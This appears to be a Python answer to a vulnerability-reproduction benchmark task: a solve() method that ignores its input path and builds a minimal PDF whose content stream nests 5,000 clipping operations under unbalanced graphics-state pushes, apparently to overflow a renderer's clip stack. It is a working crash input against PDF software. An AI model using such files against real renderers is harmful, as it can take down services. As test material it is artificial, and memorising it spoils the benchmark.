import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._make_deep_clip_pdf()

    def _make_deep_clip_pdf(self, depth: int = 5000) -> bytes:
        # Build a content stream with many nested clipping operations
        lines = []
        lines.append("1 0 0 1 0 0 cm\n")  # identity matrix, harmless op
        rect_cmd = "0 0 10 10 re W n\n"
        # Add many clip operations with a push of the graphics state
        for _ in range(depth):
            lines.append("q ")
            lines.append(rect_cmd)
        # One pop to at least close the last pushed state
        lines.append("Q\n")
        content = "".join(lines).encode("ascii")

        parts = []
        # PDF header
        parts.append(b"%PDF-1.4\n")

        offsets = []

        def current_offset() -> int:
            return sum(len(p) for p in parts)

        def add_obj(obj_no: int, body: bytes):
            offsets.append(current_offset())
            parts.append(f"{obj_no} 0 obj\n".encode("ascii"))
            parts.append(body)
            parts.append(b"\nendobj\n")

        # 1: Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        # 2: Pages
        add_obj(2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>")
        # 3: Single Page
        add_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
        )
        # 4: Content stream with deep clipping
        stream_dict = (
            f"<< /Length {len(content)} >>\nstream\n".encode("ascii")
            + content
            + b"\nendstream"
        )
        add_obj(4, stream_dict)

        # xref table
        xref_offset = current_offset()
        xref_lines = ["xref\n0 5\n0000000000 65535 f \n"]
        for off in offsets:
            xref_lines.append(f"{off:010} 00000 n \n")
        xref = "".join(xref_lines).encode("ascii")

        trailer = (
            f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{xref_offset}\n%%EOF\n".encode(
                "ascii"
            )
        )

        parts.append(xref)
        parts.append(trailer)

        return b"".join(parts)